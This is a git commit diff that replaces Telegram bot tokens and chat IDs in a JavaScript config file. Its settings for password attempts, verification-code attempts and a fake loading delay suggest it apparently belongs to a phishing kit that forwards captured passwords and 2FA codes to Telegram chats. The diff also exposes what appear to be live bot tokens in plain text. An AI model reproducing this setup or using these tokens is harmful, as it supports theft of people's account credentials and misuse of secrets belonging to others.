282199c9da5ab1434649665738d3503696174f33
vinhvebo99-gif <vinhvebo99@gmail.com>
2025-08-25 15:19:26 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
-    token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    chat_id: '1662565121',
-    noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    noti_chat_id: '-4872736754',
+    token: '8349499223:AAFdmd0RK44I_TCx7887cV4NYB3HgkNEmnk',
+    chat_id: '1630746094',
+    noti_token: '8349499223:AAFdmd0RK44I_TCx7887cV4NYB3HgkNEmnk',
+    noti_chat_id: '-4840301817',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
